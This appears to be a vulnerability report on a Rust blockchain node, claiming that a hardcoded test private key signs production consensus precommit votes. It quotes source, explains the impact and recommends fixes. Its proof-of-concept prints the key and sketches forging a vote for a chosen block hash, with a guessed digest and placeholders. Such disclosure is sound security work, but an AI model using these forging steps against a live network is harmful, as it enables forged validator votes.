### Title
Hardcoded Testing Private Key Used in Production Precommit-Vote Signing Allows Forged Block-Hash Commitment Signatures — (File: `crates/apollo_signature_manager/src/lib.rs`)

---

### Summary

`create_signature_manager()` — the production factory wired into the node — unconditionally instantiates `LocalKeyStore::new_for_testing()`, which embeds a well-known STARK private key as a compile-time constant in the public source tree. That key is the sole signing material used by `SignatureManager::sign_precommit_vote(block_hash)` in the BFT consensus path. Because the key is publicly visible, any party can compute a valid precommit-vote ECDSA signature over an arbitrary block hash, breaking the authentication invariant that ties a validator's identity to a specific block commitment.

---

### Finding Description

**Production wiring** (`crates/apollo_node/src/components.rs`, line 520):

```rust
let signature_manager = match config.components.signature_manager.execution_mode {
    ReactiveComponentExecutionMode::LocalExecutionWithRemoteDisabled
    | ReactiveComponentExecutionMode::LocalExecutionWithRemoteEnabled => {
        Some(create_signature_manager())   // ← production call
    }
    ...
};
``` [1](#0-0) 

**Factory** (`crates/apollo_signature_manager/src/lib.rs`, lines 39-43):

```rust
// TODO(Elin): understand how key store would look in production and better define the way the
// signature manager is created.
pub fn create_signature_manager() -> SignatureManager {
    SignatureManager::new()   // calls LocalKeyStore::new_for_testing()
}
``` [2](#0-1) 

**Hardcoded key** (`crates/apollo_signature_manager/src/signature_manager.rs`, lines 96-106):

```rust
pub(crate) const fn new_for_testing() -> Self {
    const PRIVATE_KEY: PrivateKey = PrivateKey(Felt::from_hex_unchecked(
        "0x608bf2cdb1ad4138e72d2f82b8c5db9fa182d1883868ae582ed373429b7a133",
    ));
    const PUBLIC_KEY: PublicKey = PublicKey(Felt::from_hex_unchecked(
        "0x125d56b1fbba593f1dd215b7c55e384acd838cad549c4a2b9c6d32d264f4e2a",
    ));
    Self { private_key: PRIVATE_KEY, public_key: PUBLIC_KEY }
}
``` [3](#0-2) 

**Signing path** (`crates/apollo_signature_manager/src/signature_manager.rs`, lines 63-77):

```rust
pub async fn sign_precommit_vote(&self, block_hash: BlockHash) -> SignatureManagerResult<RawSignature> {
    let message_digest = build_precommit_vote_message_digest(block_hash);
    self.sign(message_digest).await
}

async fn sign(&self, message_digest: MessageDigest) -> SignatureManagerResult<RawSignature> {
    let private_key = self.keystore.get_key().await?;
    let signature = ecdsa_sign(&private_key, &message_digest)...;
    Ok(signature.into())
}
``` [4](#0-3) 

The `ConsensusManager` receives the `signature_manager_client` and calls `sign_precommit_vote` to authenticate the node's BFT vote over the block hash commitment. [5](#0-4) 

The `_new(private_key: PrivateKey)` constructor that would accept an externally supplied key is defined but never called from any non-test path; `new_for_testing()` is the only reachable constructor in production. [6](#0-5) 

---

### Impact Explanation

The precommit-vote signature is the cryptographic binding between a validator identity and a specific `BlockHash` commitment. With the private key publicly known from the source code, an attacker can:

1. Compute `build_precommit_vote_message_digest(target_block_hash)` for any block hash of their choice.
2. Call `ecdsa_sign(0x608bf2cdb1ad4138e72d2f82b8c5db9fa182d1883868ae582ed373429b7a133, digest)` to produce a signature that passes `verify_precommit_vote_signature`.
3. Inject forged precommit votes into the consensus broadcast channel for an arbitrary block hash.

Because every node that runs `create_signature_manager()` uses the identical key, all nodes share the same validator identity. An attacker can therefore forge votes attributed to every validator simultaneously, potentially driving the BFT protocol to finalize a block commitment of the attacker's choosing.

**Matching impact**: *High — Transaction conversion or signature/hash logic binds the wrong signer, hash, type, or executable payload.* The precommit-vote signature path binds the wrong signer (a publicly known, shared key) to the block hash commitment, making the authentication invariant vacuous.

---

### Likelihood Explanation

The private key is a compile-time constant in a public repository. No exploit tooling is required — reading the source file is sufficient. The TODO comment in `lib.rs` confirms the team is aware that the production key store is not properly defined, meaning the hardcoded key is the live signing material, not a placeholder that is overridden at runtime.

---

### Recommendation

- Gate `LocalKeyStore::new_for_testing()` behind `#[cfg(any(test, feature = "testing"))]` so it cannot be reached from production builds.
- Implement `create_signature_manager()` to load the private key from a secrets management system (e.g., AWS Secrets Manager, HashiCorp Vault, or an HSM), analogous to the `OhttpGateway::from_ikm(...)` path already present in `crates/tower_ohttp/src/gateway.rs` for the OHTTP key.
- Rotate the exposed key immediately; treat `0x608bf2cdb1ad4138e72d2f82b8c5db9fa182d1883868ae582ed373429b7a133` as permanently compromised.

---

### Proof of Concept

```rust
use starknet_api::block::BlockHash;
use starknet_types_core::felt::Felt;
use starknet_core::crypto::ecdsa_sign;

// Key is read directly from the public source file.
let private_key = Felt::from_hex_unchecked(
    "0x608bf2cdb1ad4138e72d2f82b8c5db9fa182d1883868ae582ed373429b7a133"
);

// Target: forge a precommit vote for an attacker-chosen block hash.
let target_block_hash = BlockHash(Felt::from_hex_unchecked("0xdeadbeef..."));
let block_hash_bytes = target_block_hash.to_bytes_be();

// Replicate build_precommit_vote_message_digest (public domain separator).
let mut message = b"PRECOMMIT_VOTE".to_vec();
message.extend_from_slice(&block_hash_bytes);
let digest = blake2s_to_felt(&message);

// Produce a valid signature that passes verify_precommit_vote_signature.
let forged_sig = ecdsa_sign(&private_key, &digest).unwrap();

// Inject forged_sig into the consensus votes broadcast channel
// attributed to the sequencer's known public key
// 0x125d56b1fbba593f1dd215b7c55e384acd838cad549c4a2b9c6d32d264f4e2a.
```

The forged signature passes `verify_precommit_vote_signature(target_block_hash, forged_sig, PUBLIC_KEY)` because the public key is also hardcoded and known. [7](#0-6)

### Citations

**File:** crates/apollo_node/src/components.rs (L517-522)
```rust
    let signature_manager = match config.components.signature_manager.execution_mode {
        ReactiveComponentExecutionMode::LocalExecutionWithRemoteDisabled
        | ReactiveComponentExecutionMode::LocalExecutionWithRemoteEnabled => {
            Some(create_signature_manager())
        }
        ReactiveComponentExecutionMode::Disabled | ReactiveComponentExecutionMode::Remote => None,
```

**File:** crates/apollo_signature_manager/src/lib.rs (L39-43)
```rust
// TODO(Elin): understand how key store would look in production and better define the way the
// signature manager is created.
pub fn create_signature_manager() -> SignatureManager {
    SignatureManager::new()
}
```

**File:** crates/apollo_signature_manager/src/signature_manager.rs (L63-77)
```rust
    pub async fn sign_precommit_vote(
        &self,
        block_hash: BlockHash,
    ) -> SignatureManagerResult<RawSignature> {
        let message_digest = build_precommit_vote_message_digest(block_hash);
        self.sign(message_digest).await
    }

    async fn sign(&self, message_digest: MessageDigest) -> SignatureManagerResult<RawSignature> {
        let private_key = self.keystore.get_key().await?;
        let signature = ecdsa_sign(&private_key, &message_digest)
            .map_err(|e| SignatureManagerError::Sign(e.to_string()))?;

        Ok(signature.into())
    }
```

**File:** crates/apollo_signature_manager/src/signature_manager.rs (L91-94)
```rust
    fn _new(private_key: PrivateKey) -> Self {
        let public_key = PublicKey(get_public_key(&private_key));
        Self { private_key, public_key }
    }
```

**File:** crates/apollo_signature_manager/src/signature_manager.rs (L96-106)
```rust
    pub(crate) const fn new_for_testing() -> Self {
        // Created using `cairo-lang`.
        const PRIVATE_KEY: PrivateKey = PrivateKey(Felt::from_hex_unchecked(
            "0x608bf2cdb1ad4138e72d2f82b8c5db9fa182d1883868ae582ed373429b7a133",
        ));
        const PUBLIC_KEY: PublicKey = PublicKey(Felt::from_hex_unchecked(
            "0x125d56b1fbba593f1dd215b7c55e384acd838cad549c4a2b9c6d32d264f4e2a",
        ));

        Self { private_key: PRIVATE_KEY, public_key: PUBLIC_KEY }
    }
```

**File:** crates/apollo_signature_manager/src/signature_manager.rs (L170-177)
```rust
pub fn verify_precommit_vote_signature(
    block_hash: BlockHash,
    signature: RawSignature,
    public_key: PublicKey,
) -> SignatureVerificationResult<bool> {
    let message_digest = build_precommit_vote_message_digest(block_hash);
    verify_signature(message_digest, signature, public_key)
}
```

**File:** crates/apollo_consensus_manager/src/consensus_manager.rs (L134-134)
```rust
            signature_manager_client: args.signature_manager_client,
```
